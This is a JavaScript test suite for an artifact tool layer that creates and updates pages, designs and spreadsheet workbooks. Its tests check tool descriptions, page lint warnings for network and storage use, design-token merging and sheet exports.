  for (const topic of ['## Precedence', 'sandbox', 'artifact_brief', 'Sheets do not use recipes', 'Only pages and documents pin', 'baseVersion', 'edits']) {
    assert.ok(skill.content.includes(topic), `skill covers ${topic}`);
  }
  const registered = [];
  applyTools({
    tools: { register: (tool) => { registered.push(tool.name); return () => {}; } },
    workspaceRegistry: registry,
    workingDirectory: { ensure: async () => wsA },
  });
  assert.equal(registered.length, 14);
  assert.ok(registered.includes('artifact_brief') && registered.includes('artifact_guide_update') && registered.includes('artifact_import'));
});

test('AC-071: write tool descriptions name the skill and the precedence rule', () => {
  const { byName } = toolsFor('ses-a', wsA);
  for (const name of ['artifact_create', 'artifact_update']) {
    const description = byName[name].description;
    assert.match(description, /artifact-design skill/);
    assert.match(description, /the user's request, then saved conventions, then the recipe, then the design system, then your own choices/);
    assert.ok(description.length < 1200, `${name} is ${description.length} characters`);
  }
});

test('AC-072: page checks return warnings without blocking the write', async () => {
  const clean = '<!doctype html><html><head><meta name="viewport" content="width=device-width"><style>body{color:var(--artifact-color-text);max-width:720px}</style></head><body><h1>Hi</h1></body></html>';
  assert.deepEqual(checkPage(clean), []);
  const cases = {
    network: '<img src="https://example.com/a.png">',
    storage: '<script>localStorage.setItem("a","b")</script>',
    'fixed-width': '<div style="width: 1200px"></div>',
  };
  for (const [code, snippet] of Object.entries(cases)) {
    const codes = checkPage(clean.replace('<h1>Hi</h1>', snippet)).map((item) => item.split(':')[0]);
    assert.deepEqual(codes, [code], code);
  }
  assert.deepEqual(checkPage('<meta name="viewport" content="width=device-width"><h1>No tokens</h1>').map((item) => item.split(':')[0]), ['no-tokens']);
  assert.deepEqual(checkPage(clean.replace('<meta name="viewport" content="width=device-width">', '')).map((item) => item.split(':')[0]), ['viewport']);
  const tutorial = clean.replace('<h1>Hi</h1>', '<p>Never call localStorage here.</p><pre><code>fetch("https://api.example.com")</code></pre><!-- <img src="https://x.example/a.png"> -->');
  assert.deepEqual(checkPage(tutorial), [], 'prose, code samples, and comments raised warnings');
  assert.deepEqual(checkPage(clean.replace('<h1>Hi</h1>', '<script>fetch("/x")</script>')).map((item) => item.split(':')[0]), ['network']);
  const { run, byName } = toolsFor('ses-a', wsA);
  const created = await run('artifact_create', { type: 'page', title: 'Warn', content: PAGE });
  assert.equal(created.version, 1);
  assert.deepEqual(created.warnings.map((item) => item.split(':')[0]), ['viewport', 'no-tokens']);
  assert.match(byName.artifact_create.output.render({}, created)[0].text, /Warnings, fix all of them in one update:\n- viewport/);
  const updated = await run('artifact_update', { id: created.id, baseVersion: 1, content: clean });
  assert.deepEqual(updated.warnings, []);
  const renamed = await run('artifact_update', { id: created.id, baseVersion: 2, title: 'Renamed' });
  assert.deepEqual(renamed.warnings, []);
  const edited = await run('artifact_update', { id: created.id, baseVersion: 3, edits: [{ oldText: '<h1>Hi</h1>', newText: '<img src="https://cdn.example/x.png">' }] });
  assert.deepEqual(edited.warnings.map((item) => item.split(':')[0]), ['network']);
  const doc = await run('artifact_create', { type: 'doc', title: 'Doc', content: '# Fetch https://example.com' });
  assert.deepEqual(doc.warnings, []);
});

test('AC-073: dark tokens and the display font resolve and old files still load', async () => {
  const old = { schemaVersion: 1, name: 'Old', colors: { primary: '#111111' }, typography: { fontFamily: 'Georgia, serif' } };
  const merged = mergeTokens(DEFAULT_TOKENS, old);
  assert.equal(merged.colors.primary, '#111111');
  assert.deepEqual(merged.colorsDark, DEFAULT_TOKENS.colorsDark);
  assert.equal(merged.typography.displayFamily, DEFAULT_TOKENS.typography.displayFamily);
  const css = tokensToCss(mergeTokens(DEFAULT_TOKENS, { colorsDark: { surface: '#000000' }, typography: { displayFamily: 'Charter, serif' } }));
  assert.match(css, /--artifact-font-display: Charter, serif;/);
  assert.match(css, /:root\[data-artifact-theme="dark"\] \{[^}]*--artifact-color-surface: #000000;/);
  assert.match(css, /@media \(prefers-color-scheme: dark\) \{\s*:root\[data-artifact-theme="auto"\]/);
  const svc = service();
  const libraryHome = path.join(home, 'artifacts/v1');
  await fs.mkdir(libraryHome, { recursive: true });
  await fs.writeFile(path.join(libraryHome, 'design-system.json'), JSON.stringify(old));
  const resolved = await svc.designSystem({});
  assert.equal(resolved.source, 'library');
  assert.equal(resolved.tokens.colors.primary, '#111111');
  await fs.rm(path.join(libraryHome, 'design-system.json'));
  await assert.rejects(Promise.resolve().then(() => mergeTokens(DEFAULT_TOKENS, { colorsDark: { text: 'red;}' } })), (error) => error.code === 'artifact/invalid-tokens');
  const optedIn = composePage('<meta name="color-scheme" content="light dark"><p>x</p>', css, PAGE_CSP, 't', '', 'dark');
  assert.match(optedIn, /<html data-artifact-theme="dark">/);
  assert.match(composePage('<p>x</p>', css, PAGE_CSP, 't', '', 'dark'), /<html><head>/);
});

test('AC-091: shared skill and page brief retain preflight and batched save discipline', async () => {
  const skills = [];
  applySkill({ skills: { register: (skill) => { skills.push(skill); return () => {}; } } });
  const [skill] = skills;
  assert.match(skill.content, /## Check before you save/);
  assert.match(skill.content, /Finish the artifact before the first save/);
  const { run } = toolsFor('ses-a', wsA);
  const { brief } = await run('artifact_brief', { type: 'page', recipe: 'general' });
  assert.match(brief, /render a scratch copy outside the artifact/);
  assert.match(skill.content, /fix all of them in one artifact_update/);
  assert.match(skill.content, /Never send one update per finding/);
  assert.match(skill.content, /Do not run polish passes the user did not ask for/);
  assert.doesNotMatch(skill.content, /fix them in a follow-up update/);
  const { byName } = toolsFor('ses-a', wsA);
  assert.match(byName.artifact_create.description, /Check before saving and batch fixes into one update/);
  assert.match(byName.artifact_update.description, /never send one update per finding/);
  for (const name of ['artifact_create', 'artifact_update']) {
    assert.ok(byName[name].description.length < 1200, `${name} is ${byName[name].description.length} characters`);
  }
});

test('FEAT-007 AC-068: a mockup request gets a design, and a failed design is reported, not redone as a page', async () => {
  const skills = [];
  applySkill({ skills: { register: (skill) => { skills.push(skill); return () => {}; } } });
  const [skill] = skills;
  assert.match(skill.content, /A request for a mockup or a wireframe always gets design, even when it shows a flow/);
  assert.match(skill.content, /If the user offers both, such as "a page or a mockup", make a mockup/);
  assert.match(skill.content, /Never title or describe a page as a mockup/);
  const { run } = toolsFor('ses-a', wsA);
  const { brief } = await run('artifact_brief', { type: 'design', recipe: 'general' });
  assert.match(brief, /### When a design write fails/);
  assert.match(brief, /Stop and show the user the exact error/);
  assert.match(skill.content, /Never switch to a page or a doc to work around a failed design/);
  assert.doesNotMatch(skill.content, /calculators, diagrams, prototypes\./);
  const { byName } = toolsFor('ses-a', wsA);
  const type = byName.artifact_create.parameters.properties.type.description;
  assert.match(type, /A mockup or wireframe is always design/);
  assert.match(type, /never redo it as a page/);
});

test('AC-084: artifact_create description tells the model to use an artifact when the user asks for one', () => {
  const { byName } = toolsFor('ses-a', wsA);
  const description = byName.artifact_create.description;
  assert.match(description, /If the user asks for an artifact, an artifact page, or an artifact doc/);
  assert.match(description, /create it here with the matching type and never write a project file instead/);
});


/** A small sheet workbook that exercises literals, formulas, and styles. */
function sheetFixture(extra = {}) {
  return JSON.stringify({
    schemaVersion: 1,
    sheets: [
      {
        name: 'Budget',
        cells: {
          A1: 'Item',
          B1: 'Cost',
          C1: 'With tax',
          A2: 'Hosting',
          B2: 1200,
          C2: '=B2*1.2',
          B3: 800,
          B4: '=SUM(B2:B3)',
          ...extra,
        },
        columnWidths: { A: 160 },
      },
    ],
  });
}

test('SHEET-AC-001: artifact_create stores a canonical sheet workbook at version 1', async () => {
  const svc = service();
  const { run } = toolsFor('ses-a', wsA, svc);
  const content = JSON.stringify({ sheets: [{ cells: { C2: '=B2*1.2', B2: 1200, A1: 'Item' }, name: 'Budget' }] });
  const value = await run('artifact_create', { type: 'sheet', title: 'Budget sheet', content });
  assert.equal(value.type, 'sheet');
  assert.equal(value.version, 1);
  assert.equal(value.generation, null);
  const read = await svc.read(A, value.id);
  assert.equal(read.manifest.contentFile, 'sheet.json');
  const workbook = parseSheetWorkbook(read.content);
  assert.deepEqual(Object.keys(workbook.sheets[0].cells), ['A1', 'B2', 'C2']);
  assert.equal(read.content, serializeSheetWorkbook(workbook));
  assert.ok(await exists(path.join(storeHome('ws-a'), value.id, 'content', 'sheet.json')));
  await fs.rm(storeHome('ws-a'), { recursive: true, force: true });
});

test('SHEET-AC-002: invalid sheet content is refused and leaves no directory', async () => {
  const svc = service();
  const { run } = toolsFor('ses-a', wsA, svc);
  await fs.mkdir(storeHome('ws-a'), { recursive: true });
  const before = (await fs.readdir(storeHome('ws-a'), { withFileTypes: true })).filter((entry) => entry.isDirectory()).map((entry) => entry.name);
  await rejects(run('artifact_create', { type: 'sheet', title: 'Broken', content: '{not json' }), 'artifact/invalid-sheet');
  await rejects(run('artifact_create', { type: 'sheet', title: 'Bad cell', content: JSON.stringify({ sheets: [{ name: 'S', cells: { A1: { value: 1, formula: '=A1' } } }] }) }), 'artifact/invalid-sheet');
  const after = (await fs.readdir(storeHome('ws-a'), { withFileTypes: true })).filter((entry) => entry.isDirectory()).map((entry) => entry.name);
  assert.deepEqual(after, before);
  await fs.rm(storeHome('ws-a'), { recursive: true, force: true });
});

test('SHEET-AC-003: artifact_sheet_update edits cells and structure in one version', async () => {
  const svc = service();
  const { run } = toolsFor('ses-a', wsA, svc);
  const created = await run('artifact_create', { type: 'sheet', title: 'Editable', content: sheetFixture() });
  const updated = await run('artifact_sheet_update', {
    id: created.id,
    baseVersion: 1,
    operations: [
      { op: 'set', sheet: 'Budget', ref: 'A3', value: 'Support' },
      { op: 'write', sheet: 'Budget', ref: 'D2', values: [['Tax', 0.2], ['=B2*E2', null]] },
      { op: 'format', sheet: 'Budget', range: 'A1:C1', style: { bold: true, background: '#fff2cc' } },
      { op: 'add-sheet', name: 'Summary' },
      { op: 'write', sheet: 'Summary', ref: 'A1', values: [['Total', '=Budget!B4']] },
      { op: 'set-column-width', sheet: 'Budget', column: 'B', width: 140 },
    ],
  });
  assert.equal(updated.version, 2);
  assert.equal(updated.warnings.length, 0);
  assert.ok(updated.notes.length >= 6);
  assert.deepEqual(updated.sheets.map((sheet) => sheet.name), ['Budget', 'Summary']);
  const read = await svc.read(A, created.id);
  const workbook = parseSheetWorkbook(read.content);
  assert.equal(workbook.sheets[0].cells.A3?.value, 'Support');
  assert.equal(workbook.sheets[0].cells.D3?.formula, '=B2*E2');
  assert.equal(workbook.sheets[0].cells.A1?.style?.bold, true);
  assert.equal(workbook.sheets[0].columnWidths?.B, 140);
  assert.equal(workbook.sheets[1]?.cells.B1?.formula, '=Budget!B4');
  await fs.rm(storeHome('ws-a'), { recursive: true, force: true });
});

test('SHEET-AC-004: a stale sheet update is refused and the content stays intact', async () => {
  const svc = service();
  const { run } = toolsFor('ses-a', wsA, svc);
  const created = await run('artifact_create', { type: 'sheet', title: 'Stale', content: sheetFixture() });
  await run('artifact_sheet_update', { id: created.id, baseVersion: 1, operations: [{ op: 'set', ref: 'A1', value: 'Changed' }] });
  const before = (await svc.read(A, created.id)).content;
  await rejects(run('artifact_sheet_update', { id: created.id, baseVersion: 1, operations: [{ op: 'set', ref: 'A1', value: 'Clobbered' }] }), 'artifact/stale-version');
  assert.equal((await svc.read(A, created.id)).content, before);
  await fs.rm(storeHome('ws-a'), { recursive: true, force: true });
});

test('SHEET-AC-005: formula problems return as warnings without blocking the save', async () => {
  const svc = service();
  const { run } = toolsFor('ses-a', wsA, svc);
  const created = await run('artifact_create', { type: 'sheet', title: 'Formulas', content: sheetFixture({ D2: '=NOSUCH(1)', D3: '=1/0' }) });
  assert.ok(created.warnings.some((warning) => warning.includes('#NAME?')));
  const updated = await run('artifact_sheet_update', {
    id: created.id,
    baseVersion: 1,
    operations: [{ op: 'set', ref: 'D4', formula: '=D3+1' }],
  });
  assert.equal(updated.version, 2);
  assert.ok(updated.warnings.some((warning) => warning.includes('#DIV/0!')), JSON.stringify(updated.warnings));
  await fs.rm(storeHome('ws-a'), { recursive: true, force: true });
});

test('SHEET-AC-006: the read tool returns a content-free sheet overview', async () => {
  const svc = service();
  const { run } = toolsFor('ses-a', wsA, svc);
  const created = await run('artifact_create', { type: 'sheet', title: 'Overview', content: sheetFixture() });
  const read = await run('artifact_read', { id: created.id });
  assert.equal(read.sheetInfo.length, 1);
  assert.equal(read.sheetInfo[0].name, 'Budget');
  assert.equal(read.sheetInfo[0].cells, 8);
  assert.equal(read.sheetInfo[0].formulas, 2);
  assert.doesNotMatch(JSON.stringify(read.sheetInfo), /Hosting/);
  await fs.rm(storeHome('ws-a'), { recursive: true, force: true });
});

test('SHEET-AC-007: sheet csv, xlsx, and printable output carry computed values', async () => {
  const svc = service();
  const { run } = toolsFor('ses-a', wsA, svc);
  const created = await run('artifact_create', { type: 'sheet', title: 'Export', content: sheetFixture() });
  const csv = await svc.export(A, created.id, 'csv');
  const csvText = await fs.readFile(csv.path, 'utf8');
  assert.match(csvText, /Hosting,1200,1440/);
  assert.match(csvText, /,2000,/);
  const xlsx = await svc.export(A, created.id, 'xlsx');
  const bytes = await fs.readFile(xlsx.path);
  assert.equal(bytes.subarray(0, 2).toString(), 'PK');
  const parts = unzipSync(new Uint8Array(bytes));
  assert.ok(parts['xl/workbook.xml'] !== undefined);
  const sheetXml = strFromU8(parts['xl/worksheets/sheet1.xml']);
  assert.match(sheetXml, /<sheetData>/);
  assert.match(sheetXml, /<f>B2\*1\.2<\/f><v>1440<\/v>/);
  assert.match(sheetXml, /<f>SUM\(B2:B3\)<\/f><v>2000<\/v>/);
  assert.match(strFromU8(parts['xl/workbook.xml']), /name="Budget"/);
  const printable = await svc.printable(A, created.id);
  assert.match(printable.html, /<table>/);
  assert.match(printable.html, /1440/);
  assert.match(printable.html, /2000/);
  await fs.rm(storeHome('ws-a'), { recursive: true, force: true });
});

test('SHEET-AC-008: a sheet cannot be rebased and list filters by its type', async () => {
  const svc = service();
  const { run } = toolsFor('ses-a', wsA, svc);
  const created = await run('artifact_create', { type: 'sheet', title: 'No rebase', content: sheetFixture() });
  await rejects(svc.rebase(A, created.id, { baseVersion: 1, source: { origin: 'user', action: 'rebase' } }), 'artifact/unsupported-type');
  const listed = await svc.list(A, { type: 'sheet' });
  assert.ok(listed.items.some((item) => item.id === created.id));
  const pages = await svc.list(A, { type: 'page' });
  assert.ok(pages.items.every((item) => item.type === 'page'));
  await fs.rm(storeHome('ws-a'), { recursive: true, force: true });
});

